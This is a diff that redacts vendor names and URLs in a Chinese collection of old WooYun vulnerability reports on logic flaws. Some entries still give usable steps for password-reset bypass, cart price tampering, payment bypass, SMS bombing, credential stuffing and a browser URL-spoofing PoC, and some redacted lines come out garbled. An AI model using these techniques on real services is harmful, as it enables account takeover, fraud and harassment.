@@ -33,8 +33,8 @@
 **标题**: TOM在线某接口设计缺陷可导致撞库用户
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **URL示例**: 
-  - `http://pass.tom.com/login.php此处接口没有验证码限制也没有登录限制的，抓包之后发现用户名和密码明文传输的然后测试撞库发现是可以的，贴出部分成功帐号证明来：gameice02...`
-  - `http://pass.tom.com/login.php此处接口没有验证码限制也没有登录限制的，抓包之后发现用户名和密码明文传输的然后测试撞库发现是可以的，贴出部分成功帐号证明来：gameice02...`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
@@ -49,8 +49,8 @@
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **参数**: `sign, url, account, createTime, timestamp`
 **URL示例**: 
-  - `http://act.vip.xunlei.com/waplogin/login.html?url=http%3A%2F%2Fjifen.xunlei.com%2Fweixinservice%2Fex...`
-  - `http://act.vip.xunlei.com/kfweixin/?openId=orWeAjsn10Nin0w0vq7wPgbfbrrE&createTime=1442980310&sign=c...`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
@@ -64,7 +64,7 @@
   ```
 
 ### 案例 3: wooyun-2015-0157940
-**标题**: 房地产投资之--雅戈尔集团股份有限公司设计缺陷信息泄露
+**标题**: 某单位存在安全漏洞股份有限公司设计缺陷信息泄露
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **参数**: `wp_id, need_exclusive, needChangePwd, user, trivallog`
 **URL示例**: 
@@ -87,18 +87,18 @@
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **参数**: `code`
 **URL示例**: 
-  - `http://www.licdai.com/我们在首页找个土豪fanglu1**就这个土豪,果断找回密码！提示账号不错在，测试发现验证码长时间不会失效，抓包！POST`
-  - `http://www.licdai.comX-Requested-With:`
+  - `https://example.com/[已脱敏]`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
-  Origin: http://www.licdai.comX-Requested-With: XMLHt
+  Origin: https://example.com/[已脱敏] XMLHt
   ```
   ```
-  orm-urlencodedReferer: http://www.licdai.com/forgetA
+  orm-urlencodedReferer: https://example.com/[已脱敏]
   ```
   ```
-  ; q=0.01Origin: http://www.licd
+  ; q=0.01Origin: https://example.com/[已脱敏]
   ```
 
 ### 案例 5: wooyun-2015-0104574
@@ -107,7 +107,7 @@
 **洞察提取**:
 
 ### 案例 6: wooyun-2014-048068
-**标题**: 京东折扣优惠商品的业务逻辑问题
+**标题**: 某电商平台折扣优惠商品的业务逻辑问题
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **洞察提取**:
 
@@ -132,9 +132,9 @@
 **标题**: 华为某重要站点存在任意密码重置漏洞
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **URL示例**: 
-  - `http://paas-developer.huawei.com/home/login.htm在忘记密码处，利用手机找回密码，输入我们自己的手机账号（可不用注册，验证码也能下发成功），点击发送验证码，...`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 漏洞地址：http://paas-developer.huawei.com/home/login.htm在忘记密码处，利用手机找回密码，输入我们自己的手机账号（可不用注册，验证码也能下发成功），点击发送验证码，输入收到的验证码和新密码，提交时抓包将我们自己的手机号修改为别人的手机号，提交，密码重置成功。
+  - 漏洞地址：https://example.com/[已脱敏]
 
 ### 案例 10: wooyun-2012-011899
 **标题**: 畅途网任意用户密码修改
@@ -145,9 +145,9 @@
 **标题**: 橡果国际任意账户密码重置
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **URL示例**: 
-  - `http://www.xiangguo.com/find/password输入18888888888发送验证码后，随便输个验证码，然后会自动发包看验证码是否正确。截返回的包修改false`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 任意手机号注册，任意账户密码重置找回密码的地方http://www.xiangguo.com/find/password输入18888888888发送验证码后，随便输个验证码，然后会自动发包看验证码是否正确。截返回的包修改false 为true就可以重置了任意手机号注册同理
+  - 任意手机号注册，任意账户密码重置找回密码的地方https://example.com/[已脱敏] 为true就可以重置了任意手机号注册同理
 **Payload片段**:
   ```
   ord输入18888888888发送验证码后，随便输个验证码，然后会自动发包看验证码是否正确。截返回的包
@@ -157,17 +157,17 @@
 **标题**: 某连锁酒店验证码设置不当可修改用户密码
 **原始类型**: 漏洞类型：网络设计缺陷/逻辑错误
 **URL示例**: 
-  - `http://www.wyn88.com/user/login.html`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - http://www.wyn88.com/user/login.html 找回密码 找了网站上留的一个联系人 不好意思~~然后找回发现验证码直接在返回信息中，填入ok 登陆结果什么都没 走了~~
+  - https://example.com/[已脱敏] 找回密码 找了网站上留的一个联系人 不好意思~~然后找回发现验证码直接在返回信息中，填入ok 登陆结果什么都没 走了~~
 
 ### 案例 13: wooyun-2015-0126466
 **标题**: 良仓某处缺陷可导致任意用户密码修改
 **原始类型**: 漏洞类型：设计缺陷/逻辑错误
 **URL示例**: 
-  - `http://www.iliangcang.com/i/ufindpwd/输入手机号，验证码，来到这里,注意，不用点击发送验证码修改返回值，注意前面的空格成功`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 首先来到忘记密码处http://www.iliangcang.com/i/ufindpwd/输入手机号，验证码，来到这里,注意，不用点击发送验证码修改返回值，注意前面的空格成功
+  - 首先来到忘记密码处https://example.com/[已脱敏]
 
 ### 案例 14: wooyun-2015-0115632
 **标题**: 一嗨租车越权删除整站发票信息（19W数据）
@@ -199,7 +199,7 @@
 #### wooyun-2015-0117052
 **上海机场WIFI系统web portal绕过登陆及其它几种风险分析**
 - 参数: `err_flag, userName, essid, paramStr, url`
-- Payload: `Origin: https://wlan.ct10000.comUser-Agent: Mozilla/`
+- Payload: `Origin: https://example.com/[已脱敏] Mozilla/`
 
 #### wooyun-2014-063895
 **Destoon 20140530最新版超全局变量覆盖导致的安全问题(官方demo演示)**
@@ -214,7 +214,7 @@
 #### wooyun-2014-061633
 **某通用图书馆检索系统可修改任意用户密码**
 - 参数: `__EVENTARGUMENT, __VIEWSTATE, page, __EVENTVALIDATION`
-- Payload: `Origin: http://lib.szsy.cnUser-Agent: Mozilla/5.0 (W`
+- Payload: `Origin: https://example.com/[已脱敏] Mozilla/5.0 (W`
 
 #### wooyun-2015-0159704
 **安全狗最新版网站防护SQL注入bypass**
@@ -347,7 +347,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店http://www.haohaizi.com/2.买一件小短裤送给灾区的小朋友吧，俺也是个很有爱心的人呢！3.抓包查看提交的信息：4.POST的数据中不难看出，虽然商品的金额使用goodsIds参数在服务器端获得，但是数量参数counts这里是不是能改下呢？尝试改成-1，点击forward提交：act=addCartGoods&goodsIds=1448279&counts=1&bigorsmalls=25.查看返回结果，金额确实也是负数了，怎么办！
+**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店https://example.com/[已脱敏]
 
 **POC**: 6.再买两件衣服吧，一共只需要9元：7.点击结算，查看订单信息如下，嗯，加上18元的快递费，仍然只需要付27元哦！8.选择网上银行支付，支付的金额仍是27元哪！测试到这里就结束了，话说有礼物么？
 
@@ -391,7 +391,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用qq邮箱测试了下，虽然腾讯对qq邮箱内容的显示有所优化，但是qq客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）
+**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用某互联网公司邮箱测试了下，虽然某互联网公司对某互联网公司邮箱内容的显示有所优化，但是某互联网公司客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）
 
 **POC**: 看上面，很详细了。
 
@@ -415,7 +415,7 @@
 
 **详情**: 文件夹名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun设备名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun
 
-**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：http://abc.com/com1.wooyun/com1.wooyun.asp 却可以正常访问。
+**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：https://example.com/[已脱敏] 却可以正常访问。
 
 **绕过**: 直接利用
 
@@ -457,7 +457,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先百度到美的的ＩＭＳ然后各种登录尝试，在使用美的员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧
+**详情**: 首先某搜索引擎到美的的ＩＭＳ然后各种登录尝试，在使用美的员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧
 
 **POC**: (见原文)
 
@@ -467,8 +467,8 @@
 ---
 
 ---
-### [wooyun-2013-020995] QQ好友聊天发送文件给对方直接冻结对方QQ号码
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-020995] 某互联网公司好友聊天发送文件给对方直接冻结对方某互联网公司号码
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -479,13 +479,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发送不良的文件给QQ好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的QQ冻结掉我的博客http://www.chinanaizui.com/
+**详情**: 发送不良的文件给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的某互联网公司冻结掉我的博客https://example.com/[已脱敏]
 
-**POC**: 然后发送给QQ好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方QQ号码就被冻结如图差不多15分钟到30分钟就搞定了
+**POC**: 然后发送给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方某互联网公司号码就被冻结如图差不多15分钟到30分钟就搞定了
 
 **绕过**: 直接利用
 
-**修复**: 腾讯懂的
+**修复**: 某互联网公司懂的
 ---
 
 ---
@@ -501,7 +501,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转支付宝
+**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转某电商平台
 
 **POC**: 如上
 
@@ -511,8 +511,8 @@
 ---
 
 ---
-### [wooyun-2012-013133] 移动微博手机短信轰炸
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2012-013133] 移动某社交平台手机短信轰炸
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -523,7 +523,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 移动微博对用户登录采用两种验证模式，其中短信接收这里处理不当，导致短信轰炸一直F5 刷新下面页面吧～http://weibo.10086.cn/ajax/nipass.php?crumb=2ddbe31c540b024d39cd3d6e63641816&mobile=13********7
+**详情**: 移动某社交平台对用户登录采用两种验证模式，其中短信接收这里处理不当，导致短信轰炸一直F5 刷新下面页面吧～https://example.com/[已脱敏]
 
 **POC**: 自测成功，不信你留移动手机号～
 
@@ -533,8 +533,8 @@
 ---
 
 ---
-### [wooyun-2013-018982] 新浪微博登录逻辑漏洞导致密码hash成为明文密码
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-018982] 某社交平台某社交平台登录逻辑漏洞导致密码hash成为明文密码
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -545,9 +545,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 研究了下微博登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。微博采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，微博后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)
+**详情**: 研究了下某社交平台登陆：1，没用https，2，用如下算法加密：SHA1(SHA1(SHA1(password))+servertime+nonc)，3，servertime和nonc由prelogin.php从服务端颁发。某社交平台采用这样方式的动机应该是：1，http性能好又方便，https部署麻烦，支持多终端不方便。所以选择http作为认证协议。2，基于#1的决策，为了防止网络嗅探用户被盗用密码，所以在js中 SHA1(password)，一层不放心，做两层：SHA1(SHA1(password))3，为了防止用户弱口令，加上salt4，为了防止暴力破解，采用salt服务器端颁发的方式基于#1，2，3，4的逻辑链，产生了现在的登录流程和密码加密算法。这样做的隐患是：基于现在的逻辑，某社交平台后端user表中的password只能存储SHA1(password)或者SHA1(SHA1(password)
 
-**POC**: 下图为微博前端js中的password加密部分
+**POC**: 下图为某社交平台前端js中的password加密部分
 
 **绕过**: 直接利用
 
@@ -577,8 +577,8 @@
 ---
 
 ---
-### [wooyun-2014-061571] QQ空间Android版逻辑缺陷导致隐私泄漏
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-061571] 某互联网公司空间Android版逻辑缺陷导致隐私泄漏
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -589,7 +589,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取
+**详情**: 某互联网公司空间Android版对file域下符号链接限制不当，可导致cookie等用户隐私被窃取
 
 **POC**: import android.net.Uri;import android.os.Bundle;import android.app.Activity;import android.content.Intent;public class MainActivity extends Activity {public final static String MY_PKG ="com.example.testqzone";public final static String MY_TMP_DIR ="/data/data/" + MY_PKG + "/tmp/";public final static
 
@@ -699,7 +699,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在浏览器模式下打开http://suggestion.baidu.com/su;/1.bat;?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875然后它会弹出下载的页面。接着下载打开就直接执行这个了，详情还是要看看参考才行呢
+**详情**: 在浏览器模式下打开https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -809,7 +809,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # http://my.fund123.cn主页登录时，测试了中国TOP500的姓名拼音，密码123456，成功了32个，进入账号可以对个人信息、基金信息、米币信息做查看与修改，换个更大的字典的话可以成功更多，账号的校验较弱。首页跑账号，1000多的是成功的试着登录几个可以对基金做查看、删除、添加基金交易等等操作。
+**详情**: # https://example.com/[已脱敏]
 
 **POC**: #个人信息泄露：#基金信息泄露：
 
@@ -831,7 +831,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xj169.com
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 将3000都改为100将3000都改为100得到票了！
 
@@ -841,8 +841,8 @@
 ---
 
 ---
-### [wooyun-2011-03293] 异地过QQ二代密保三个问题验证
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03293] 异地过某互联网公司二代密保三个问题验证
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -853,9 +853,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大家都知道异地登录QQ后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开QQ面板的消息管理器  找到以前的 或者QQ里面的陌生人 （没有联系人 可以加自己的QQ）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧
+**详情**: 大家都知道异地登录某互联网公司后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开某互联网公司面板的消息管理器  找到以前的 或者某互联网公司里面的陌生人 （没有联系人 可以加自己的某互联网公司）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧
 
-**POC**: 这里以一个QQ为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：
+**POC**: 这里以一个某互联网公司为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：
 
 **绕过**: 直接利用
 
@@ -886,7 +886,7 @@
 
 ---
 ### [wooyun-2015-0157507] 亲宝宝Android客户端任意账户密码重置
-**厂商**: http://www.qbb6.com/ | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+**厂商**: https://example.com/[已脱敏] | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -907,8 +907,8 @@
 ---
 
 ---
-### [wooyun-2014-084515] 中国联通某省套餐购买逻辑漏洞+订单泄露
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-084515] 某运营商某省套餐购买逻辑漏洞+订单泄露
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -919,7 +919,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 套餐购买地址：http://app.weixin.gzuni.com/z/liantong/order/free?gid=49&agency_id=00002截包修改订单价格：查看订单地址：http://epay.woigz.cn/z/liantong/order/view?agency_id=00002&order_num=WD2014112416445768根据order_num查看订单，而order_num为年月日+时间，可遍历，根据返回长度判断，部分返回服务器绝对路径：
+**详情**: 套餐购买地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -943,7 +943,7 @@
 
 **详情**: 
 
-**POC**: <form action="https://www.google.com/csi" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>
+**POC**: <form action="https://example.com/[已脱敏]" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>
 
 **绕过**: 直接利用
 
@@ -1007,7 +1007,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://v.ganji.com/code/sendCode/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: Notice: Undefined index: phone in /data/server/www/ganji_v3/apps/lottery/controller/LotteryCodeController.php on line 114Fatal error: Uncaught exception 'Exception' with message '1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right 
 
@@ -1029,7 +1029,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://www.zoomla.cn/Edit/ShowEdit.aspx?Dir=../../&OpenWords=TxtTagKeyUrl:http://demo.zoomla.cn/Edit/ShowEdit.aspx?Dir=&OpenWords=TxtTagKey上次提交没有截图完整这次Dir=.参数没有严格处理， 可以跳出upload目录读取到其他目录文件。导致可以遍历目录。攻击者可以收集信息进一步攻击。
+**详情**: URL：https://example.com/[已脱敏] 可以跳出upload目录读取到其他目录文件。导致可以遍历目录。攻击者可以收集信息进一步攻击。
 
 **POC**: 目录浏览，泄漏官方备份源码。
 
@@ -1039,7 +1039,7 @@
 ---
 
 ---
-### [wooyun-2015-0108184] 淘美网逻辑漏洞美女QQ、手机号等信息免费任意看（1分钱都不给）
+### [wooyun-2015-0108184] 淘美网逻辑漏洞美女某互联网公司、手机号等信息免费任意看（1分钱都不给）
 **厂商**: 淘美网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -1051,7 +1051,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 淘美网重置处存在逻辑漏洞，可绕过支付直接充值成功经过测试发现支付成功后流程走至如下链接：http://www.3need.com/index.php?controller=site&action=payok&out_trade_no=充值订单号只要提供对应的充值订单号 就可以绕过支付直接充值成功。新注册个账号进行测试：账号余额0：我们去充值，这个过程用burpsuite抓包，金额随意写抓到支付订单号然后构造链接：http://www.3need.com/index.php?controller=site&action=payok&out_trade_no=3need1429095660直接访问这个链接接下来美女信息随意看了，不够再充
+**详情**: 淘美网重置处存在逻辑漏洞，可绕过支付直接充值成功经过测试发现支付成功后流程走至如下链接：https://example.com/[已脱敏] 就可以绕过支付直接充值成功。新注册个账号进行测试：账号余额0：我们去充值，这个过程用burpsuite抓包，金额随意写抓到支付订单号然后构造链接：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1095,9 +1095,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先先列举一下安卓客户端的一些问题：1、allowBackup="true"2、代码未做混淆3、未做重打包防护4、使用AES对称加密算法，且秘钥硬编码5、调试代码过多对于第一个问题本文将不做证明，危害请看http://www.droidsec.cn/%E8%AF%A6%E8%A7%A3android-app-allowbackup%E9%85%8D%E7%BD%AE%E5%B8%A6%E6%9D%A5%E7%9A%84%E9%A3%8E%E9%99%A9/本文将重点说明使用AES加密算法且秘钥硬编码带来的危害。AES是对称加密算法，即加密秘钥和解密秘钥是一样的，当其秘钥硬编码的时候，则无法起到真正隐藏信息的作用。
+**详情**: 首先先列举一下安卓客户端的一些问题：1、allowBackup="true"2、代码未做混淆3、未做重打包防护4、使用AES对称加密算法，且秘钥硬编码5、调试代码过多对于第一个问题本文将不做证明，危害请看https://example.com/[已脱敏]
 
-**POC**: 下面将一步一步讲解如何解密神州租车安卓APP客户端请求数据从而进行攻击。首先，通过burp代理app的数据，抓包如下：http://mapi.zuche.com/m/order/queryShortOrderList.action?cid=100305&uid=ca92db58-3046-455f-a333-3194aa8590f5&q=IpoxHm9eMFWsQi%2br867eFaAKiSNt7WuTELTu7oOqqoI%3d可见请求的关键数据被加密了，我们只有找到加密算法并解密才能进行进一步的安全测试。一、算法逆向分析：使用JEB或者dex2jar逆向客户端代码，JEB的效果更好一点，
+**POC**: 下面将一步一步讲解如何解密神州租车安卓APP客户端请求数据从而进行攻击。首先，通过burp代理app的数据，抓包如下：https://example.com/[已脱敏]
 
 **绕过**: 编码绕过
 
@@ -1117,9 +1117,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type: application/x-www-form-urlencodedHost: qrk.kuaipai.cnProxy-Connection: closeConnection: closebarco
+**详情**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/[IP已脱敏] Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type: application/x-www-form-urlencodedHost: qrk.kuaipai.cnProxy-Connection: closeConnection: closebarco
 
-**POC**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type
+**POC**: 先生成一个二维码然后用诚品快拍扫一下执行了我的js弹窗代码再次扫码并抓包POST /loganal/useStat.action HTTP/1.1Accept-Encoding: gzipUser-Agent: Mozilla/5.0 (Linux; Android 4.4.4; MI 2 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/[IP已脱敏] Mobile Safari/537.36 Android:KuaiPaiQR/2.5Content-Length: 261Content-Type
 
 **绕过**: 直接利用
 
@@ -1139,7 +1139,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: www.ieeyou.cnhttp://www.ieeyou.cn/asms/index.jspadmin  admin一数万旅客信息泄露，机票所有信息和会员信息（身份证——电话——住址——航程——航班）可用于机票诈骗二任意操作他人机票订单，退票，三可以不要钱大量买机票，并且可以出票（屌丝的福利）四短信轰炸(可以任意发送短信）
+**详情**: www.ieeyou.cnhttps://example.com/[已脱敏]  admin一数万旅客信息泄露，机票所有信息和会员信息（身份证——电话——住址——航程——航班）可用于机票诈骗二任意操作他人机票订单，退票，三可以不要钱大量买机票，并且可以出票（屌丝的福利）四短信轰炸(可以任意发送短信）
 
 **POC**: 随便查询了下， 8w条数据， 就是8万份旅客信息（身份证，姓名， 地址什么的，航程），点订单信息可以看，见上图，还有这个可大量出真票，几千元一张，我可以不敢用，还可以退票 ，发短信， 做其它好多好多。。。
 
@@ -1171,8 +1171,8 @@
 ---
 
 ---
-### [wooyun-2013-020538] 阿里巴巴旗下某站支付漏洞
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-020538] 某电商平台旗下某站支付漏洞
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -1183,7 +1183,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 出问题的是这个站点 http://www.alibaba.com/阿里巴巴国际站点开一件商品然后修改数据 这里我把商品价格改成了0.1刀/件订单价格成功更改
+**详情**: 出问题的是这个站点 https://example.com/[已脱敏] 这里我把商品价格改成了0.1刀/件订单价格成功更改
 
 **POC**: (见原文)
 
@@ -1193,8 +1193,8 @@
 ---
 
 ---
-### [wooyun-2014-065301] 百度浏览器6.4.0.49133伪造任意网址漏洞
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-065301] 某搜索引擎浏览器6.4.0.49133伪造任意网址漏洞
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -1207,7 +1207,7 @@
 
 **详情**: URL长度大于4KB时处理出错，例如将证明文件保存为c:\a.htm并打开，点击连接后可以伪造任意网址。同时URL过长的时候，会显示“已收藏”图标，估计是处理过长url时逻辑有点小问题
 
-**POC**: <html><div id='c' style=''> //displaynoness</div><a href="#" target="newwin" id='v' style="display:block" onclick="invokePoC();window.open('javascript:1;','newwin');">just click me</a><script>function invokePoC() {wx = open("http://www.baidu.com/account/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+**POC**: <html><div id='c' style=''> //displaynoness</div><a href="#" target="newwin" id='v' style="display:block" onclick="invokePoC();window.open('javascript:1;','newwin');">just click me</a><script>function invokePoC() {wx = open("https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1227,9 +1227,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
